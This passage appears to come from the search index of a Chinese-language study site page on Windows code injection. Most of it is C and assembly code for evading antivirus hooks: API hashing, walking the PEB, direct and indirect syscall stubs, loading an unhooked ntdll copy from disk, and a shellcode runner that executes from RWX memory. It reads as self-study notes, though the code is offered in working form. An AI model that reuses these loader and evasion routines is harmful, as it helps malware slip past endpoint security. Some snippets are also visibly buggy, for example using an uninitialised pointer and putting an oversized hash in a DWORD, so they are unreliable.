//\u65b0\u5efa\u4e00\u4e2a\u51fd\u6570\u7c7b\u578b //\u5f15\u7528CreateProcessB STARTUPINFOA si = {}; PROCESS_INFORMATION pi = {}; CreateProcessB(NULL, (LPSTR)\"C:\\\\Windows\\\\System32\\\\notepad.exe\", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi); } \u6253\u5f00\u4e86notepad\uff0c\u4f46\u5bfc\u5165\u8868\u4e2d\u6ca1\u6709CreateProcessA API-HASH2\uff08GetModuleHandle\u548cGetProcAddress\uff09 \u5b9a\u4e49\u4e0d\u540c\u7684\u51fd\u6570\u9700\u8981\u5b9e\u73b0\u4e0d\u540c\u7684\u51fd\u6570\u539f\u578b \u5934\u6587\u4ef6\u5b9a\u4e49\u7c7b\u578b // typedefs.h #pragma once #include <Windows.h> typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, * PUNICODE_STRING; typedef struct _LDR_MODULE { LIST_ENTRY InLoadOrderModuleList; LIST_ENTRY InMemoryOrderModuleList; LIST_ENTRY InInitializationOrderModuleList; PVOID BaseAddress; PVOID EntryPoint; ULONG SizeOfImage; UNICODE_STRING FullDllName; UNICODE_STRING BaseDllName; ULONG Flags; SHORT LoadCount; SHORT TlsIndex; LIST_ENTRY HashTableEntry; ULONG TimeDateStamp; } LDR_MODULE, * PLDR_MODULE; typedef struct _PEB_LDR_DATA { BYTE Reserved1[8]; PVOID Reserved2[3]; LIST_ENTRY InMemoryOrderModuleList; } PEB_LDR_DATA, * PPEB_LDR_DATA; typedef struct _RTL_USER_PROCESS_PARAMETERS { ULONG MaximumLength; ULONG Length; ULONG Flags; ULONG DebugFlags; PVOID ConsoleHandle; ULONG ConsoleFlags; HANDLE StdInputHandle; HANDLE StdOutputHandle; HANDLE StdErrorHandle; UNICODE_STRING CurrentDirectoryPath; HANDLE CurrentDirectoryHandle; UNICODE_STRING DllPath; UNICODE_STRING ImagePathName; UNICODE_STRING CommandLine; PVOID Environment; } RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS; typedef struct _PEB { BYTE Reserved1[2]; BYTE BeingDebugged; BYTE Reserved2[1]; PVOID Reserved3[2]; PPEB_LDR_DATA Ldr; PRTL_USER_PROCESS_PARAMETERS ProcessParameters; BYTE Reserved4[104]; PVOID Reserved5[52]; PVOID PostProcessInitRoutine; BYTE Reserved6[128]; PVOID Reserved7[1]; ULONG SessionId; } PEB, * PPEB; typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES; typedef OBJECT_ATTRIBUTES* POBJECT_ATTRIBUTES; #define InitializeObjectAttributes( p, n, a, r, s ) { \\ (p)->Length = sizeof( OBJECT_ATTRIBUTES ); \\ (p)->RootDirectory = r; \\ (p)->Attributes = a; \\ (p)->ObjectName = n; \\ (p)->SecurityDescriptor = s; \\ (p)->SecurityQualityOfService = NULL; \\ } typedef struct _CLIENT_ID { PVOID UniqueProcess; PVOID UniqueThread; } CLIENT_ID, * PCLIENT_ID; // NTAPI function types typedef NTSTATUS(NTAPI* typeNtOpenProcess)(_Out_ PHANDLE ProcessHandle, _In_ ACCESS_MASK DesiredAccess, _In_ POBJECT_ATTRIBUTES ObjectAttributes, _In_opt_ PCLIENT_ID ClientId); typedef NTSTATUS(NTAPI* typeNtAllocateVirtualMemory)(_In_ HANDLE ProcessHandle, _Inout_ PVOID* BaseAddress, _In_ ULONG_PTR ZeroBits, _Inout_ PSIZE_T RegionSize, _In_ ULONG AllocationType, _In_ ULONG Protect); typedef NTSTATUS(NTAPI* typeNtProtectVirtualMemory)(_In_ HANDLE ProcessHandle, _Inout_ PVOID* BaseAddress, _Inout_ PSIZE_T NumberOfBytesToProtect, ULONG NewAccessProtection, PULONG OldAccessPRotection); typedef NTSTATUS(NTAPI* typeNtWriteVirtualMemory)(_In_ HANDLE ProcessHandle, _In_ PVOID BaseAddress, _In_ PVOID Buffer, _In_ ULONG NumberOfBytesToWrite, _Out_ PULONG NumberOfBytesWritten OPTIONAL); typedef NTSTATUS(NTAPI* typeNtClose)(_In_ HANDLE Handle); \u4e3b\u6587\u4ef6 #include <windows.h> #include \"typedefs.h\" #include <stdio.h> #define HashStringA(x) HashStringFowlerNollVoVariant1aA(x) #define HashStringW(x) HashStringFowlerNollVoVariant1aW(x) #define HashStringNtdll 0x467f5122 #define HashNtCreateFile 0x20ef5396 //\u8fd9\u91cc\u53ef\u4ee5\u76f4\u63a5\u5b9a\u4e49\u4e5f\u53ef\u4ee5HashStringA\u6765\u8ba1\u7b97\uff0c\u8ba1\u7b97\u4f20\u5165\u7684\u5fc5\u987b\u662f\u5c0f\u5199 ULONG HashStringFowlerNollVoVariant1aA(_In_ LPCSTR String) { ULONG Hash = 0x6A6CCC06; while (*String) { Hash ^= (UCHAR)*String++; Hash *= 0x25EDE3FB; } return Hash; } ULONG HashStringFowlerNollVoVariant1aW(_In_ LPCWSTR String) { ULONG Hash = 0x6A6CCC06; while (*String) { Hash ^= (UCHAR)*String++; Hash *= 0x25EDE3FB; } return Hash; } HMODULE _GetModuleHandle(_In_ ULONG dllHash) { PLIST_ENTRY head = (PLIST_ENTRY) & ((PPEB)__readgsqword(0x60))->Ldr->InMemoryOrderModuleList; PLIST_ENTRY next = head->Flink; PLDR_MODULE module = (PLDR_MODULE)((PBYTE)next - 16); while (next != head) { module = (PLDR_MODULE)((PBYTE)next - 16); if (module->BaseDllName.Buffer != NULL) { if (dllHash - HashStringW(module->BaseDllName.Buffer) == 0) return (HMODULE)module->BaseAddress; } next = next->Flink; } return NULL; } FARPROC _GetProcAddress(_In_ HMODULE dllBase, _In_ ULONG funcHash) { PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)(dllBase); PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)dos + (dos)->e_lfanew); PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)dos + (nt)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); if (exports->AddressOfNames != 0) { PWORD ordinals = (PWORD)((UINT_PTR)dllBase + exports->AddressOfNameOrdinals); PDWORD names = (PDWORD)((UINT_PTR)dllBase + exports->AddressOfNames); PDWORD functions = (PDWORD)((UINT_PTR)dllBase + exports->AddressOfFunctions); for (DWORD i = 0; i < exports->NumberOfNames; i++) { LPCSTR name = (LPCSTR)((UINT_PTR)dllBase + names[i]); if (HashStringA(name) == funcHash) { PBYTE function = (PBYTE)((UINT_PTR)dllBase + functions[ordinals[i]]); return (FARPROC)function; } } } return NULL; } int main() { LPCSTR DLLNAME = \"ntdll.dll\"; LPCSTR funcname = \"NtCreateFile\"; ULONG A = HashStringA(DLLNAME); //HashString\u4f20\u5165\u7684\u53c2\u6570\u5fc5\u987b\u662f\u5c0f\u5199 ULONG B = HashStringA(funcname); printf(\"A 0x%x\\n\", A); printf(\"B 0x%x\", B); HMODULE dllBase1 = _GetModuleHandle(HashStringA(DLLNAME)); HMODULE dllBase2 = _GetModuleHandle(HashStringNtdll); //HMODULE dllBase3 = _GetModuleHandle(HashStringNtdll1); HMODULE dllBase4 = GetModuleHandleA(\"NTDLL.DLL\"); if (dllBase1 == NULL) { printf(\"Unable to locate base address of 0x%x\", dllBase1); } FARPROC addr = GetProcAddress(LoadLibraryA(\"ntdll\"), \"NtCreateFile\"); FARPROC addr1 = _GetProcAddress(dllBase1, HashNtCreateFile); //_GetProcAddress\u7b49\u540c\u4e8eGetProcAddress\uff1b_GetModuleHandle\u53ef\u4ee5\u5f53LoadLibraryA\u6765\u7528 return 0; } \u624b\u52a8\u5e95\u5c42syscall\u8c03\u7528NT*\u51fd\u6570\u7ed5hook https://j00ru.vexillium.org/syscalls/nt/64/ \u8fd9\u4e2a\u65b9\u6cd5\u662f\u6a21\u62df\u4e86\u4e00\u4e2a\u539f\u51fd\u6570\u7684 syscall \u8fc7\u7a0b\u7136\u540e\u5bf9\u8fd9\u4e2a\u51fd\u6570\u8fdb\u884c\u4e86\u66f4\u540d\uff0c\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u53ef\u4ee5\u7ed5\u8fc7\u6740\u8f6f\u7684hook\u3002 \u53ef\u4ee5\u4f7f\u7528\u6c47\u7f16\u8bed\u8a00\u7f16\u5199\u76ee\u6807\u51fd\u6570\u7684syscall\u8fc7\u7a0b\uff0c\u6765\u5b9e\u73b0\u4e00\u4e2a\u529f\u80fd\u76f8\u540c\u4f46\u540d\u79f0\u4e0d\u540c\u7684\u907f\u514d\u88ab\u6740\u8f6fhook\u7684\u51fd\u6570\u7684\u65b9\u5f0f\u3002 \u672c\u60f3\u5b9e\u73b0\u521b\u5efa\u8fdb\u7a0b\uff0c\u7531\u4e8e NTCreateProcess \u6587\u6863\u6ca1\u6709\u516c\u5f00\uff0c\u6240\u4ee5\u6309\u7167\u6559\u7a0b\u6765\u5b9e\u73b0 NtCreateFile \u51fd\u6570\u3002 \u9996\u5148\u627e\u5230 NTCreateProcess \u7684\u7cfb\u7edf\u8c03\u7528\u8fc7\u7a0b\u7684\u6c47\u7f16\u4ee3\u7801 \u53ef\u4ee5\u8c03\u8bd5\u4e00\u4e2a\u8c03\u4e86NTDLL.dll\u7684\u7a0b\u5e8f\uff0c\u627e\u5230\u51fd\u6570\u7684\u8fc7\u7a0b 0:000> u NtCreateFile ntdll!NtCreateFile: 00007ffb`3770f7e0 4c8bd1 mov r10,rcx 00007ffb`3770f7e3 b855000000 mov eax,55h 00007ffb`3770f7e8 f604250803fe7f01 test byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1 00007ffb`3770f7f0 7503 jne ntdll!NtCreateFile+0x15 (00007ffb`3770f7f5) 00007ffb`3770f7f2 0f05 syscall 00007ffb`3770f7f4 c3 ret 00007ffb`3770f7f5 cd2e int 2Eh 00007ffb`3770f7f7 c3 ret \u7cbe\u7b80\u4e00\u4e0b\uff0c\u53ef\u4ee5\u79fb\u9664 test \u548c jne .code SysNtCreateFile proc mov r10, rcx mov eax, 55h syscall ret SysNtCreateFile endp end \u627e\u5230 NtCreateFile \u7ed3\u6784\u4f53\u5e76\u521b\u5efa\u4e00\u4e2a\u76f8\u540c\u7684 SysNtCreateFile \u7ed3\u6784\u4f53\uff0c\u521d\u59cb\u5316\u53d8\u91cf\uff0c\u4e4b\u540e\u5c31\u53ef\u6b63\u5e38\u8c03\u7528 SysNtCreateFile #include <Windows.h> #include \"winternl.h\" #pragma comment(lib, \"ntdll\") EXTERN_C NTSTATUS SysNtCreateFile( PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength); int main() { //FARPROC addr = GetProcAddress(LoadLibraryA(\"ntdll\"), \"NtCreateFile\"); OBJECT_ATTRIBUTES oa; HANDLE fileHandle = NULL; NTSTATUS status = NULL; UNICODE_STRING fileName; IO_STATUS_BLOCK osb; RtlInitUnicodeString(&fileName, (PCWSTR)L\"\\\\??\\\\c:\\\\temp\\\\test.txt\"); ZeroMemory(&osb, sizeof(IO_STATUS_BLOCK)); InitializeObjectAttributes(&oa, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL); SysNtCreateFile( &fileHandle, FILE_GENERIC_WRITE, &oa, &osb, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0); return 0; } \u4ecentdll.dll\u6587\u4ef6\u8bfb\u53d6\u51fd\u6570\u5b58\u6839\u7ed5hook \u8fd9\u4e2a\u65b9\u6cd5\u662f\u76f4\u63a5\u4ece\u78c1\u76d8\u8bfb\u53d6\u4e86 ntdll \u5e76\u590d\u5236\u4e86\u4e00\u4efd\u5230\u5185\u5b58\u4e2d\uff0c\u7136\u540e\u5728\u590d\u5236\u7684 ntdll \u4e2d\u5bfb\u627e\u51fd\u6570\u7684\u5b58\u6839\uff0c\u901a\u8fc7\u4fee\u6539\u51fd\u6570\u7684\u5b58\u6839\u5730\u5740\uff0c\u6765\u5b9e\u73b0\u51fd\u6570\u4e0d\u901a\u8fc7\u539f ntdll \u6765\u5b9e\u73b0\u8c03\u7528\u3002\u6740\u8f6fhook\u6211\u8fd9\u4efd\u590d\u5236\u7684 ntdll \u4e4b\u524d\uff0c\u5c31\u5df2\u7ecf\u5b8c\u6210\u4e86\u8c03\u7528\u3002 \u5b9e\u73b0\u8fc7\u7a0b 1.\u8bfb\u53d6C:\\windows\\system32\\ntdll.dll\u6587\u4ef6\uff0c\u53e6\u5b58\u5230\u5185\u5b58\u4e2d 2.\u4ece\u5185\u5b58\u4e2d\u8bfb\u53d6\u6307\u5b9a\u51fd\u6570\u7684.rdata\u548c.text\u90e8\u5206 3.\u627e\u5230\u6307\u5b9a\u51fd\u6570\u7684\u5b58\u6839\u5b58\u5165\u5185\u5b58\u4e2d 4.\u5c06\u6307\u5b9a\u51fd\u6570\u7684\u7cfb\u7edf\u8c03\u7528\u5b58\u6839\u6307\u5411\u65b0\u5efa\u7684\u5185\u5b58\u533a\u57df 5.\u8c03\u7528\u6307\u5b9a\u51fd\u6570\uff0c\u5b9e\u9645\u4e0a\u8c03\u7528\u7684\u662f\u590d\u5236\u51fa\u6765\u7684\u5185\u5b58\u533a\u57df\u7684\u7cfb\u7edf\u8c03\u7528\u5b58\u6839\uff0c\u901a\u8fc7\u5185\u5b58\u5b58\u6839\u518d\u53bb\u6267\u884c\u76f8\u5e94\u7684\u5e95\u5c42\u8c03\u7528\uff0c\u8ddfntdll\u5b58\u6839\u662f\u4e00\u6837\u7684\uff0c\u907f\u514d\u4e86\u5728\u5185\u5b58\u4e2d\u76f4\u63a5\u8c03\u7528ntdll\u5b58\u6839 #include <iostream> #include \"Windows.h\" #include \"winternl.h\" #pragma comment(lib, \"ntdll\") int const SYSCALL_STUB_SIZE = 23; using myNtCreateFile = NTSTATUS(NTAPI*)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength); PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section) { return (PVOID)(RVA - section->VirtualAddress + section->PointerToRawData); } BOOL GetSyscallStub(LPCSTR functionName, PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, PIMAGE_SECTION_HEADER textSection, PIMAGE_SECTION_HEADER rdataSection, LPVOID syscallStub) { PDWORD addressOfNames = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfNames), rdataSection); PDWORD addressOfFunctions = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&exportDirectory->AddressOfFunctions), rdataSection); BOOL stubFound = FALSE; for (size_t i = 0; i < exportDirectory->NumberOfNames; i++) { DWORD_PTR functionNameVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfNames[i], rdataSection); DWORD_PTR functionVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfFunctions[i + 1], textSection); LPCSTR functionNameResolved = (LPCSTR)functionNameVA; if (std::strcmp(functionNameResolved, functionName) == 0) { std::memcpy(syscallStub, (LPVOID)functionVA, SYSCALL_STUB_SIZE); stubFound = TRUE; } } return stubFound; } int main(int argc, char* argv[]) { char syscallStub[SYSCALL_STUB_SIZE] = {}; SIZE_T bytesWritten = 0; DWORD oldProtection = 0; HANDLE file = NULL; DWORD fileSize = NULL; DWORD bytesRead = NULL; LPVOID fileData = NULL; // variables for NtCreateFile OBJECT_ATTRIBUTES oa; HANDLE fileHandle = NULL; NTSTATUS status = NULL; UNICODE_STRING fileName; RtlInitUnicodeString(&fileName, (PCWSTR)L\"\\\\??\\\\c:\\\\temp\\\\pwn.log\"); IO_STATUS_BLOCK osb; ZeroMemory(&osb, sizeof(IO_STATUS_BLOCK)); InitializeObjectAttributes(&oa, &fileName, OBJ_CASE_INSENSITIVE, NULL, NULL); // define NtCreateFile myNtCreateFile NtCreateFile = (myNtCreateFile)(LPVOID)syscallStub; VirtualProtect(syscallStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection); file = CreateFileA(\"c:\\\\windows\\\\system32\\\\ntdll.dll\", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); fileSize = GetFileSize(file, NULL); fileData = HeapAlloc(GetProcessHeap(), 0, fileSize); ReadFile(file, fileData, fileSize, &bytesRead, NULL); PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)fileData; PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileData + dosHeader->e_lfanew); DWORD exportDirRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress; PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(imageNTHeaders); PIMAGE_SECTION_HEADER textSection = section; PIMAGE_SECTION_HEADER rdataSection = section; for (int i = 0; i < imageNTHeaders->FileHeader.NumberOfSections; i++) { if (std::strcmp((CHAR*)section->Name, (CHAR*)\".rdata\") == 0) { rdataSection = section; break; } section++; } PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset((DWORD_PTR)fileData + exportDirRVA, rdataSection); GetSyscallStub(\"NtCreateFile\", exportDirectory, fileData, textSection, rdataSection, syscallStub); NtCreateFile(&fileHandle, FILE_GENERIC_WRITE, &oa, &osb, 0, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0); return 0; } \u624b\u52a8syscall + ApiHash #include <Windows.h> #include <stdio.h> #include <Rpc.h> #include <winternl.h> #include <Ip2string.h> #pragma comment(lib, \"ntdll\") #define NtCurrentProcess() ((HANDLE)-1) #pragma comment(lib, \"Rpcrt4.lib\") #ifndef NT_SUCCESS #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0) #endif #define UP -32 #define DOWN 32 EXTERN_C VOID GetSyscall(WORD systemCall); EXTERN_C NTSTATUS sysZwAllocateVirtualMemory( HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect ); EXTERN_C NTSTATUS sysNtProtectVirtualMemory( IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN OUT PSIZE_T RegionSize, IN ULONG NewProtect, OUT PULONG OldProtect); EXTERN_C NTSTATUS sysNtCreateThreadEx( OUT PHANDLE hThread, IN ACCESS_MASK DesiredAccess, IN PVOID ObjectAttributes, IN HANDLE ProcessHandle, IN PVOID lpStartAddress, IN PVOID lpParameter, IN ULONG Flags, IN SIZE_T StackZeroBits, IN SIZE_T SizeOfStackCommit, IN SIZE_T SizeOfStackReserve, OUT PVOID lpBytesBuffer ); EXTERN_C NTSTATUS sysNtWaitForSingleObject( IN HANDLE Handle, IN BOOLEAN Alertable, IN PLARGE_INTEGER Timeout ); struct LDR_MODULE { LIST_ENTRY e[3]; HMODULE base; void* entry; UINT size; UNICODE_STRING dllPath; UNICODE_STRING dllname; }; EXTERN_C VOID GetSyscall(WORD systemCall); EXTERN_C VOID GetSyscallAddr(INT_PTR syscallAdr); EXTERN_C NTSTATUS sysNtCreateFile( PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength ); DWORD calcHash(char* data) { DWORD hash = 0x99; for (int i = 0; i < strlen(data); i++) { hash += data[i] + (hash << 1); } return hash; } static DWORD calcHashModule(LDR_MODULE* mdll) { char name[64]; size_t i = 0; while (mdll->dllname.Buffer[i] && i < sizeof(name) - 1) { name[i] = (char)mdll->dllname.Buffer[i]; i++; } name[i] = 0; return calcHash((char*)CharLowerA(name)); } static HMODULE getModule(DWORD myHash) { HMODULE module; INT_PTR peb = __readgsqword(0x60); auto ldr = 0x18; auto flink = 0x10; auto Mldr = *(INT_PTR*)(peb + ldr); auto M1flink = *(INT_PTR*)(Mldr + flink); auto Mdl = (LDR_MODULE*)M1flink; do { Mdl = (LDR_MODULE*)Mdl->e[0].Flink; if (Mdl->base != NULL) { if (calcHashModule(Mdl) == myHash) { break; } } } while (M1flink != (INT_PTR)Mdl); module = (HMODULE)Mdl->base; return module; } static LPVOID getAPIAddr(HMODULE module, DWORD myHash) { PIMAGE_DOS_HEADER DOSheader = (PIMAGE_DOS_HEADER)module; PIMAGE_NT_HEADERS NTheader = (PIMAGE_NT_HEADERS)((LPBYTE)module + DOSheader->e_lfanew); PIMAGE_EXPORT_DIRECTORY EXdir = (PIMAGE_EXPORT_DIRECTORY)( (LPBYTE)module + NTheader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD fAddr = (PDWORD)((LPBYTE)module + EXdir->AddressOfFunctions); PDWORD fNames = (PDWORD)((LPBYTE)module + EXdir->AddressOfNames); PWORD fOrdinals = (PWORD)((LPBYTE)module + EXdir->AddressOfNameOrdinals); for (DWORD i = 0; i < EXdir->AddressOfFunctions; i++) { LPSTR pFuncName = (LPSTR)((LPBYTE)module + fNames[i]); if (calcHash(pFuncName) == myHash) { return (LPVOID)((LPBYTE)module + fAddr[fOrdinals[i]]); } } return NULL; } WORD Unh00ksyscallNum(LPVOID addr) { WORD syscall = NULL; if (*((PBYTE)addr) == 0x4c && *((PBYTE)addr + 1) == 0x8b && *((PBYTE)addr + 2) == 0xd1 && *((PBYTE)addr + 3) == 0xb8 && *((PBYTE)addr + 6) == 0x00 && *((PBYTE)addr + 7) == 0x00) { BYTE high = *((PBYTE)addr + 5); BYTE low = *((PBYTE)addr + 4); syscall = (high << 8) | low; return syscall; } if (*((PBYTE)addr) == 0xe9 || *((PBYTE)addr + 3) == 0xe9 || *((PBYTE)addr + 8) == 0xe9 || *((PBYTE)addr + 10) == 0xe9 || *((PBYTE)addr + 12) == 0xe9) { for (WORD idx = 1; idx <= 500; idx++) { if (*((PBYTE)addr + idx * DOWN) == 0x4c && *((PBYTE)addr + 1 + idx * DOWN) == 0x8b && *((PBYTE)addr + 2 + idx * DOWN) == 0xd1 && *((PBYTE)addr + 3 + idx * DOWN) == 0xb8 && *((PBYTE)addr + 6 + idx * DOWN) == 0x00 && *((PBYTE)addr + 7 + idx * DOWN) == 0x00) { BYTE high = *((PBYTE)addr + 5 + idx * DOWN); BYTE low = *((PBYTE)addr + 4 + idx * DOWN); syscall = (high << 8) | low - idx; return syscall; } if (*((PBYTE)addr + idx * UP) == 0x4c && *((PBYTE)addr + 1 + idx * UP) == 0x8b && *((PBYTE)addr + 2 + idx * UP) == 0xd1 && *((PBYTE)addr + 3 + idx * UP) == 0xb8 && *((PBYTE)addr + 6 + idx * UP) == 0x00 && *((PBYTE)addr + 7 + idx * UP) == 0x00) { BYTE high = *((PBYTE)addr + 5 + idx * UP); BYTE low = *((PBYTE)addr + 4 + idx * UP); syscall = (high << 8) | low + idx; return syscall; } } } } INT_PTR Unh00ksyscallInstr(LPVOID addr) { WORD syscall = NULL; if (*((PBYTE)addr) == 0x4c && *((PBYTE)addr + 1) == 0x8b && *((PBYTE)addr + 2) == 0xd1 && *((PBYTE)addr + 3) == 0xb8 && *((PBYTE)addr + 6) == 0x00 && *((PBYTE)addr + 7) == 0x00) { return (INT_PTR)addr + 0x12; // syscall } if (*((PBYTE)addr) == 0xe9 || *((PBYTE)addr + 3) == 0xe9 || *((PBYTE)addr + 8) == 0xe9 || *((PBYTE)addr + 10) == 0xe9 || *((PBYTE)addr + 12) == 0xe9) { for (WORD idx = 1; idx <= 500; idx++) { if (*((PBYTE)addr + idx * DOWN) == 0x4c && *((PBYTE)addr + 1 + idx * DOWN) == 0x8b && *((PBYTE)addr + 2 + idx * DOWN) == 0xd1 && *((PBYTE)addr + 3 + idx * DOWN) == 0xb8 && *((PBYTE)addr + 6 + idx * DOWN) == 0x00 && *((PBYTE)addr + 7 + idx * DOWN) == 0x00) { return (INT_PTR)addr + 0x12; } if (*((PBYTE)addr + idx * UP) == 0x4c && *((PBYTE)addr + 1 + idx * UP) == 0x8b && *((PBYTE)addr + 2 + idx * UP) == 0xd1 && *((PBYTE)addr + 3 + idx * UP) == 0xb8 && *((PBYTE)addr + 6 + idx * UP) == 0x00 && *((PBYTE)addr + 7 + idx * UP) == 0x00) { return (INT_PTR)addr + 0x12; } } } } int main() { //FARPROC addr = GetProcAddress(LoadLibraryA(\"ntdll\"), \"NtCreateFile\"); //GetModuleHandle \u7528apihash\u83b7\u53d6ntdll.dll\u53e5\u67c4 HMODULE dllBase1 = getModule(0x3E8557); HMODULE dllBase2 = GetModuleHandleA(\"ntdll.dll\"); //GetProcAddress \u7528apihash\u83b7\u53d6ZwAllocateVirtualMemory\u51fd\u6570\u57fa\u5740 LPVOID addr1 = getAPIAddr(dllBase1, 0x112da6be2b35); LPVOID addr2 = GetProcAddress(dllBase2, \"ZwAllocateVirtualMemory\"); //\u83b7\u53d6ZwAllocateVirtualMemory\u51fd\u6570\u7684syscall\u7684\u7f16\u53f7\u548csyscall\u5730\u5740 LPVOID addr; WORD syscallNum = Unh00ksyscallNum(addr); INT_PTR syscallAddr = Unh00ksyscallInstr(addr); //syscall GetSyscall(syscallNum); GetSyscallAddr(syscallAddr); //syscall\u4e4b\u540e\u6b63\u5e38\u4f7f\u7528\u51fd\u6570\uff0c\u9700\u8981\u5728asm\u4e2d\u5b9e\u73b0syscall\u8fc7\u7a0b PVOID BaseAddress = NULL; SIZE_T dwSize = 0x2000; NTSTATUS status1 = sysZwAllocateVirtualMemory(NtCurrentProcess(), &BaseAddress, 0, &dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (!NT_SUCCESS(status1)) { return 0; } return 0; } .data systemCall WORD 000h syscallAddr QWORD 0h .code GetSyscall proc mov systemCall, cx ret GetSyscall endp GetSyscallAddr proc mov syscallAddr, rcx ret GetSyscallAddr endp sysZwAllocateVirtualMemory proc mov r10, rcx mov ax, systemCall jmp qword ptr syscallAddr ret sysZwAllocateVirtualMemory endp sysNtProtectVirtualMemory proc mov r10, rcx mov ax, systemCall jmp qword ptr syscallAddr ret sysNtProtectVirtualMemory endp sysNtCreateThreadEx proc mov r10, rcx mov ax, systemCall jmp qword ptr syscallAddr ret sysNtCreateThreadEx endp sysNtWaitForSingleObject proc mov r10, rcx mov ax, systemCall jmp qword ptr syscallAddr ret sysNtWaitForSingleObject endp end","title":"\u4ee3\u7801\u6ce8\u5165\u5b66\u4e60"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#_1","text":"","title":"\u4ee3\u7801\u6ce8\u5165\u5b66\u4e60"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#_2","text":"\u8981\u6267\u884cshellcode\u9700\u8981\u6709\u4e00\u4e2aRWX\u5185\u5b58\u5757\u3002 \u5728\u672c\u4f8b\u4ee3\u7801\u4e2d VirtualAlloc\u51fd\u6570\u5206\u914d\u865a\u62df\u5185\u5b58 {\u5730\u5740, \u5927\u5c0f, \u5185\u5b58\u7c7b\u578b, \u5185\u5b58\u4fdd\u62a4} LPVOID VirtualAlloc( [in, optional] LPVOID lpAddress, [in] SIZE_T dwSize, [in] DWORD flAllocationType, [in] DWORD flProtect ); sizeof \u8fd0\u7b97\u7b26\u8ba1\u7b97shellcode\u957f\u5ea6 sizeof unary-expression sizeof ( type-name ) memcpy \u4ece\u7f13\u51b2\u533a\u590d\u5236\u5b57\u8282 #include \"Windows.h\" int main() { unsigned char shellcode[] = \"\\x48\\x31\"; void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(exec, shellcode, sizeof shellcode); ((void(*)())exec)(); return 0; }","title":"\u672c\u5730\u8fdb\u7a0b\u6ce8\u5165"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#_3","text":"\u672c\u5730\u8fdb\u7a0b\u6ce8\u5165\u542f\u52a8\u7684\u5f53\u524d\u8fdb\u7a0b\uff0c\u8fdc\u7a0b\u8fdb\u7a0b\u6ce8\u5165\u662f\u53ef\u4ee5\u5c06\u4ee3\u7801\u6ce8\u5165\u5230\u5176\u4ed6\u8fdb\u7a0b OpenProcess \u83b7\u53d6\u8fdb\u7a0b\u7684\u53e5\u67c4 VirtualAllocEx \u5728\u6307\u5b9a\u8fdb\u7a0b\u865a\u62df\u7a7a\u95f4\u7533\u8bf7\u865a\u62df\u5185\u5b58 WriteProcessMemory 